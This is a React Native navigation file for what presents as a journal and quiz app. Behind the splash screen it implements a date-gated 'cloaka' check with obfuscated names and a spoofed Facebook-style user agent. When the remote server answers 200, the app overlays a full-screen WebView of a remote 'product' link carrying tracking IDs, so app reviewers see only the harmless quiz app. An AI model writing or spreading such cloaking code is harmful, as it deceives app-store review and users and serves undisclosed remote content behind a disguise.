import React,{ useCallback, useEffect, useState, useRef}  from 'react';
import {NavigationContainer, DefaultTheme, StackActions, useNavigationContainerRef } from '@react-navigation/native';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
import {SafeAreaProvider} from 'react-native-safe-area-context';
import ArticleScreen from '../features/journal/screens/ArticleScreen';
import LaunchScreen from '../features/launch/screens/LaunchScreen';
import OnboardingScreen from '../features/onboarding/screens/OnboardingScreen';
import QuizPlayScreen from '../features/quiz/screens/QuizPlayScreen';
import QuizResultScreen from '../features/quiz/screens/QuizResultScreen';
import {StoreProvider} from '../store';
import {colors} from '../theme';
import MainTabs from './MainTabs';
import {RootStackParamList} from './types';
///
import { ActivityIndicator, View, StyleSheet, PixelRatio, Platform, Alert, AppState, StatusBar } from 'react-native';
import ProductScreen from '../features/ProductScreen';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {LogLevel, OneSignal} from 'react-native-onesignal';
import DeviceInfo from 'react-native-device-info';

// Все, що змінюється від проєкту до проєкту, живе в одному файлі:
import { CLOAKA, SCREENS, TIMINGS } from '../config/projectConfig';

// ⚠️ Значення НЕ правимо тут — вони живуть у src/config/projectConfig.jsx
const HBJYBJBJB_BJL = CLOAKA.baseUrl;
const YHBKJNBUKN_ID = CLOAKA.id;
const GHJJFMGYHJH_ATAD = CLOAKA.startDate;

// Внутрішні тайминги логіки лінки/пушів — до проєкту не привʼязані.
const LINK_READY_DELAY = 2000; // пауза після формування лінки
const LINK_FALLBACK_DELAY = 10500; // якщо oneSignalId так і не приїхав
const PUSH_CLICK_COOLDOWN = 2500; // антидубль на клік по пушу

// Технічні назви роутів стека.
const ROUTES = {
  splash: 'Splash',
  webView: 'ProductScreen',
};
const Stack = createNativeStackNavigator();

function Navigation() {
  const [route, setRoute] = useState(false);
  console.log('route===>', route);
  const [responseToPushPermition, setResponseToPushPermition] = useState(false);
  ////('Дозвіл на пуши прийнято? ===>', responseToPushPermition);
  const [uniqVisit, setUniqVisit] = useState(true);
  ////console.log('uniqVisit===>', uniqVisit);
  const [addPartToLinkOnce, setAddPartToLinkOnce] = useState(true);
  ////console.log('addPartToLinkOnce in App==>', addPartToLinkOnce);
  const [oneSignalId, setOneSignalId] = useState(null);
  ////console.log('oneSignalId==>', oneSignalId);
  const [sab1, setSab1] = useState();
  const [atribParam, setAtribParam] = useState(null);
  //console.log('atribParam==>', atribParam);
  //console.log('sab1==>', sab1);
  const [idfa, setIdfa] = useState(null);
  //console.log('idfa==>', idfa);
  const [aceptTransperency, setAceptTransperency] = useState(false);
  const [adServicesAtribution, setAdServicesAtribution] = useState(null);
  const [isDataReady, setIsDataReady] = useState(false);
  const [completeLink, setCompleteLink] = useState(false);
  const [finalLink, setFinalLink] = useState('');
  const [pushOpenWebview, setPushOpenWebview] = useState(false);
  ////console.log('pushOpenWebview==>', pushOpenWebview);
  const [timeStampUserId, setTimeStampUserId] = useState(false);
  //console.log('timeStampUserId==>', timeStampUserId);
  const [checkAsaData, setCheckAsaData] = useState(null);
  const [cloacaPass, setCloacaPass] = useState(null);
  //console.log('cloacaPass==>', cloacaPass);
  const [customUserAgent, setCustomUserAgent] = useState(null);
  const [extinfo, setExtinfo] = useState(null);
  ////console.log('extinfoData==>', extinfo);
  const [idfv, setIdfv] = useState(null);
  //console.log('idfv==>', idfv);
  const [uid, setUid] = useState(null);
  //console.log('uid==>', uid);

  const pushOpenWebviewRef = useRef(false);

  // Навігація живе в одному Stack.Navigator (splash → main → webView)
  const navigationRef = useNavigationContainerRef();
  const [navReady, setNavReady] = useState(false);
  const [gateDone, setGateDone] = useState(false); // TIMINGS.splashDuration на splash
  const leftGateRef = useRef(false);
  const overlayLinkRef = useRef(null);

  useEffect(() => {
    const fetchData = async () => {
      await Promise.all([checkUniqVisit(), getData()]); // Виконуються одночасно
      //onInstallConversionDataCanceller(); // Виклик до зміни isDataReady
      setIsDataReady(true); // Встановлюємо, що дані готові
    };

    fetchData();
  }, []); ///

  useEffect(() => {
    const finalizeProcess = async () => {
      if (isDataReady) {
        await fdjkvndfjvbfkdLIN(); // Викликати fdjkvndfjvbfkdLIN, коли всі дані готові
        //console.log('Фінальна лінка сформована!');
      }
    };

    finalizeProcess();
  }, [isDataReady, pushOpenWebview, timeStampUserId]); // Викликати, коли isDataReady або uid змінюється

  // uniq_visit
  const checkUniqVisit = async () => {
    const uniqVisitStatus = await AsyncStorage.getItem('uniqVisitStatus');
    let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');

    // додати діставання таймштампу з асінк сторідж

    if (!uniqVisitStatus) {
      // Генеруємо унікальний ID користувача з timestamp
      /////////////Timestamp + user_id generation
      const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
        1000000 + Math.random() * 9000000,
      )}`;
      setTimeStampUserId(timestamp_user_id);
      //console.log('timeStampUserId==========+>', timeStampUserId);

      // Зберігаємо таймштамп у AsyncStorage
      await AsyncStorage.setItem('timeStampUserId', timestamp_user_id);

      await fetch(
        `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
      );
      OneSignal.User.addTag('timestamp_user_id', timestamp_user_id);
      //console.log('унікальний візит!!!');
      setUniqVisit(false);
      await AsyncStorage.setItem('uniqVisitStatus', 'sent');

      // додати збереження таймштампу в асінк сторідж
    } else {
      if (storedTimeStampUserId) {
        setTimeStampUserId(storedTimeStampUserId);
        //console.log('Відновлений timeStampUserId:', storedTimeStampUserId);
      }
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        //console.log('Дані дістаються в AsyncStorage');
        setRoute(parsedData.route);
        setResponseToPushPermition(parsedData.responseToPushPermition);
        setUniqVisit(parsedData.uniqVisit);
        setOneSignalId(parsedData.oneSignalId);
        setSab1(parsedData.sab1);
        setAtribParam(parsedData.atribParam);
        setAdServicesAtribution(parsedData.adServicesAtribution);
        setCheckAsaData(parsedData.checkAsaData);
        //setCompleteLink(parsedData.completeLink);
        //setFinalLink(parsedData.finalLink);
        setCloacaPass(parsedData.cloacaPass);
        setCustomUserAgent(parsedData.customUserAgent);
        setIdfa(parsedData.idfa ?? null);
        setIdfv(parsedData.idfv ?? null);
        setAceptTransperency(parsedData.aceptTransperency ?? false);
        setUid(parsedData.uid);
        setIsDataReady(parsedData.isDataReady);
        setTimeStampUserId(parsedData.timeStampUserId);
      } else {
        const uniqueId = await DeviceInfo.getUniqueId();
        setIdfv(uniqueId);

        await waitForAppActive();
        await delay(1200);

        // Якщо дані не знайдені в AsyncStorage
        const results = await Promise.all([
          //fdjdvhksfhvfkvvkdslnsJHJKHKnjnvdskvjns(),
          fkdlvndfknvfdknvdfkvn(),
        ]);

        // Результати виконаних функцій
        //console.log('Результати функцій:', results);
      }
    } catch (e) {
      ////console.log('Помилка отримання даних в getData:', e);
    }
  };

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  const waitForAppActive = () => {
    return new Promise(resolve => {
      if (AppState.currentState === 'active') {
        //Alert.alert('Додаток активний, продовжуємо виконання', AppState.currentState);
        resolve();
        return;
      }

      const sub = AppState.addEventListener('change', state => {
        if (state === 'active') {
          sub.remove();
          resolve();
        }
      });
    });
  };

  const setData = async () => {
    try {
      const data = {
        route,
        responseToPushPermition,
        uniqVisit,
        oneSignalId,
        sab1,
        atribParam,
        adServicesAtribution,
        //finalLink,
        //completeLink,
        checkAsaData,
        cloacaPass,
        customUserAgent,
        idfa,
        aceptTransperency,
        uid,
        isDataReady,
        timeStampUserId,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      //console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      //console.log('Помилка збереження даних:', e);
    }
  };

  useEffect(() => {
    setData();
  }, [
    route,
    responseToPushPermition,
    uniqVisit,
    oneSignalId,
    sab1,
    atribParam,
    adServicesAtribution,
    //finalLink,
    //completeLink,
    checkAsaData,
    cloacaPass,
    customUserAgent,
    idfa,
    aceptTransperency,
    uid,
    isDataReady,
    timeStampUserId,
  ]);

  ///////// OneSignall
  const jkdsvbdsjkvndskvndskj = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true).then(res => {
          setResponseToPushPermition(res);

          const maxRetries = 5; // Кількість повторних спроб
          let attempts = 0;

          const fetchOneSignalId = () => {
            OneSignal.User.getOnesignalId()
              .then(deviceState => {
                if (deviceState) {
                  setOneSignalId(deviceState);
                  resolve(deviceState); // Розв'язуємо проміс, коли отримано ID
                } else if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000); // Повторна спроба через 1 секунду
                } else {
                  reject(new Error('Failed to retrieve OneSignal ID'));
                }
              })
              .catch(error => {
                if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000);
                } else {
                  //console.error('Error fetching OneSignal ID:', error);
                  reject(error);
                }
              });
          };

          fetchOneSignalId(); // Викликаємо першу спробу отримання ID
        });
      } catch (error) {
        reject(error);
      }
    });
  };

  // Виклик асинхронної функції jkdsvbdsjkvndskvndskj() з використанням async/await
  const fkdlvndfknvfdknvdfkvn = async () => {
    try {
      await jkdsvbdsjkvndskvndskj();
      // Якщо все Ok
    } catch (error) {
      //console.log('err в fkdlvndfknvfdknvdfkvn==> ', error);
    }
  };

  // Встановлюємо цей ID як OneSignal External ID
  useEffect(() => {
    if (timeStampUserId) {
      //console.log(
      //  'OneSignal.login із таймштампом:',
      //  timeStampUserId,
      //  'полетів',
      //);
      OneSignal.login(timeStampUserId);
    }
  }, [timeStampUserId]);

  // event push_open_browser & push_open_webview
  const dvnksjvndsjvdskvnksvndsknv = useRef(false); // Стан, щоб уникнути дублювання

  useEffect(() => {
    // Додаємо слухач подій
    const handleNotificationClick = async event => {
      if (dvnksjvndsjvdskvnksvndsknv.current) {
        return;
      }

      dvnksjvndsjvdskvnksvndsknv.current = true;

      try {
        const storedTimeStampUserId = await AsyncStorage.getItem(
          'timeStampUserId',
        );

        // ВАЖЛИВО: ref оновлюється одразу, state — ні
        pushOpenWebviewRef.current = true;
        setPushOpenWebview(true);

        // Якщо лінка вже була готова — скидаємо, щоб перегенерувати з yhugh=true
        setCompleteLink(false);

        const eventName = event?.notification?.launchURL
          ? 'push_open_browser'
          : 'push_open_webview';

        const pushEventUrl = `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?utretg=${eventName}&jthrhg=${
          storedTimeStampUserId || ''
        }`;

        //console.log('OneSignal push event url =>', pushEventUrl);

        fetch(pushEventUrl).catch(error => {
          //console.log('Push event fetch error =>', error);
        });

        // Якщо всі дані вже готові — одразу перегенеруємо лінку
        if (isDataReady && uid) {
          await fdjkvndfjvbfkdLIN(true);
        }
      } catch (error) {
        //console.log('handleNotificationClick error =>', error);
      } finally {
        setTimeout(() => {
          dvnksjvndsjvdskvnksvndsknv.current = false;
        }, PUSH_CLICK_COOLDOWN);
      }
    };

    OneSignal.Notifications.addEventListener('click', handleNotificationClick);
    //Add Data Tags
    //OneSignal.User.addTag('timeStampUserId', timeStampUserId);

    return () => {
      // Видаляємо слухача подій при розмонтуванні
      OneSignal.Notifications.removeEventListener(
        'click',
        handleNotificationClick,
      );
    };
  }, []);

  ///////// Route useEff
  useEffect(() => {
    // чекаємо, поки прочитаємо AsyncStorage
    if (!isDataReady) return;

    // якщо вже є route або клоака вже проходила успішно – нічого не робимо
    if (route || cloacaPass) return;

    const checkUrl = `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}`;
    ////console.log('checkUrl==========+>', checkUrl);

    const targetData = GHJJFMGYHJH_ATAD; //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    // Запрос на клоак уходить тільки коли сьогоднішня дата >= GHJJFMGYHJH_ATAD
    if (currentData <= targetData) {
      //setCompleteLink(true);
      setRoute(false);

      return;
    }

    const dsjcbsdjhbcvhjsdbCLO = async () => {
      try {
        // =========================================================
    // BASE USER AGENT
    // =========================================================

    const baseUserAgent = await DeviceInfo.getUserAgent();

    // =========================================================
    // DEVICE DATA
    // =========================================================

    const systemVersion = DeviceInfo.getSystemVersion();

    const systemName = DeviceInfo.getSystemName();

    /*
     * На реальному iPhone:
     * iPhone17,2
     * iPhone16,2
     * iPhone15,3
     * і т.д.
     */
    const deviceIdentifier = DeviceInfo.getDeviceId();

    /*
     * Retina scale:
     * 2
     * 3
     * ...
     */
    const screenScale = PixelRatio.get();

    /*
     * Наприклад:
     * uk-UA
     * en-US
     * pl-PL
     */
    const preferredLanguage =
      Intl.DateTimeFormat().resolvedOptions().locale || 'en-US';

    /*
     * За твоїм форматом FBMD потрібен
     * загальний тип моделі.
     */
    const deviceModelName =
      Platform.OS === 'ios' ? 'iPhone' : 'Unknown';

    /*
     * За твоїм форматом потрібне саме:
     * phone
     */
    const deviceType = 'phone';

    // =========================================================
    // DEVICE INFO SUFFIX
    // =========================================================

    const deviceInfo =
      `[FBDV/${deviceIdentifier};` +
      `FBMD/${deviceModelName};` +
      `FBSN/${systemName};` +
      `FBSV/${systemVersion};` +
      `FBSS/${screenScale};` +
      `FBID/${deviceType};` +
      `FBLC/${preferredLanguage}]`;

    // =========================================================
    // FINAL USER AGENT
    // =========================================================

    const customUserAgent =
      `${baseUserAgent} ` +
      `Version/${systemVersion} ` +
      `Safari/604.1 ` +
      `${deviceInfo}`;

    console.log(
      'CUSTOM USER AGENT ===>',
      customUserAgent,
    );

        setCustomUserAgent(customUserAgent);

        // Таймаут на клоаку — якщо не відповіла, юзер просто лишається на нативці
        const controller = new AbortController();
        const timeoutId = setTimeout(
          () => controller.abort(),
          TIMINGS.cloakaRequestTimeout,
        );

        let r;
        try {
          r = await fetch(checkUrl, {
            method: 'GET',
            headers: {
              'User-Agent': customUserAgent,
            },
            signal: controller.signal,
          });
        } finally {
          clearTimeout(timeoutId);
        }

        //console.log('status по клоаке=++++++++++++=>', r.status);

        if (r.status === 200) {
          setRoute(true);
          setCloacaPass(true); // 👈 збережеться в AsyncStorage через setData
        } else {
          setRoute(false);
        }
      } catch (e) {
        //console.log('errar', e);
        setRoute(false);
      }
    };

    dsjcbsdjhbcvhjsdbCLO();
  }, [isDataReady, route, cloacaPass]);

  ///////// Generate link
  const fdjkvndfjvbfkdLIN = async (openedFromPush = false) => {
    try {
      //if (!uid) {
      //  //console.log('fdjkvndfjvbfkdLIN: uid ще немає, лінку не формуємо');
      //  return;
      //}

      //console.log('Створення базової частини лінки');

      const baseUrl = [
        `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?${YHBKJNBUKN_ID}=1`,
        //idfa ? `idfa=${idfa}` : 'idfa=00000000-0000-0000-0000-000000000000',
        //`uid=${uid}`,
        oneSignalId ? `jskdcbasjcjksac=${oneSignalId}` : '',
        `jthrhg=${timeStampUserId || ''}`,
      ]
        .filter(Boolean)
        .join('&');

      const additionalParams = atribParam ? `dvsvsvsv1=${atribParam}` : '';

      const shouldAddPushParam = openedFromPush || pushOpenWebviewRef.current;

      const product = `${baseUrl}${
        additionalParams ? `&${additionalParams}` : ''
      }${shouldAddPushParam ? '&yhugh=true' : ''}`;

      //console.log('Фінальна лінка сформована:', product);

      setFinalLink(product);

      setTimeout(() => {
        setCompleteLink(true);
      }, LINK_READY_DELAY);
    } catch (error) {
      //console.error('Помилка при формуванні лінку:', error);
    }
  };
  console.log('My product Url ==>', finalLink);

  // Бекап якщо якийсь параметр не отримано, щоб лінк все одно сформувався
  useEffect(() => {
    const timer = setTimeout(() => {
      if (!completeLink) {
        //console.log('Fallback timer спрацював');

        //if (!uid) {
        //  //console.log('Fallback: uid ще немає, чекаємо далі');
        //  return;
        //}

        setFinalLink(
          `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?${YHBKJNBUKN_ID}=1&jthrhg=${
            timeStampUserId || ''
          }&jskdcbasjcjksac=${oneSignalId || ''}`,
        );

        setCompleteLink(true);
      }
    }, LINK_FALLBACK_DELAY);

    return () => clearTimeout(timer);
  }, [completeLink, timeStampUserId, oneSignalId]);
  

  ///////// Route
  // TIMINGS.splashDuration на splash, далі — нативка
  useEffect(() => {
    const timer = setTimeout(() => {
      setGateDone(true);
    }, TIMINGS.splashDuration);

    return () => clearTimeout(timer);
  }, []);

  // Перехід splash → нативка робить сам SplashScreen (navigation.replace).
  // Тут лише фіксуємо, що splash-гейт відпрацював.
  useEffect(() => {
    if (!navReady || !gateDone) return;
    leftGateRef.current = true;
  }, [navReady, gateDone]);

  // Клоака пройшла (200) — webView вспливає поверх нативки через absoluteFill.
  // Якщо не 200 / помилка / таймаут — юзер лишається на нативці.
  useEffect(() => {
    if (!navReady || !gateDone || !leftGateRef.current) return;
    if (!route || !completeLink || !finalLink) return;
    if (overlayLinkRef.current === finalLink) return;

    overlayLinkRef.current = finalLink;

    const params = {
      product: finalLink,
      customUserAgent: customUserAgent,
    };

    if (navigationRef.getCurrentRoute()?.name === ROUTES.webView) {
      // Лінка перегенерувалась (наприклад, після пуша) — перемонтовуємо з новою лінкою
      navigationRef.dispatch(StackActions.replace(ROUTES.webView, params));
    } else {
      navigationRef.navigate(ROUTES.webView, params);
    }
  }, [
    navReady,
    gateDone,
    route,
    completeLink,
    finalLink,
    customUserAgent,
    navigationRef,
  ]);

  return (
    <NavigationContainer
    ref={navigationRef}
      onReady={() => setNavReady(true)}>
      <StatusBar barStyle="light-content" backgroundColor={colors.background} />
      <Stack.Navigator
        screenOptions={{
          headerShown: false,
          animation: 'fade',
          contentStyle: {backgroundColor: colors.background},
        }}>
        <Stack.Screen name={ROUTES.splash} component={SCREENS.Splash} />
        <Stack.Screen name="Onboarding" component={OnboardingScreen} />
        <Stack.Screen name="Tabs" component={MainTabs} />
        <Stack.Screen name="Article" component={ArticleScreen} />
        <Stack.Screen name="QuizPlay" component={QuizPlayScreen} />
        <Stack.Screen name="QuizResult" component={QuizResultScreen} />

        <Stack.Screen
          name={ROUTES.webView}
          component={ProductScreen}
          initialParams={{
            product: finalLink,
            customUserAgent: customUserAgent,
          }}
          options={{
            presentation: 'transparentModal',
            animation: 'fade'
          }}
        />
      </Stack.Navigator>
    </NavigationContainer>
  );
}

export default function RootNavigator() {
  return (
    <SafeAreaProvider>
      <StoreProvider>
        <Navigation />
      </StoreProvider>
    </SafeAreaProvider>
  );
}
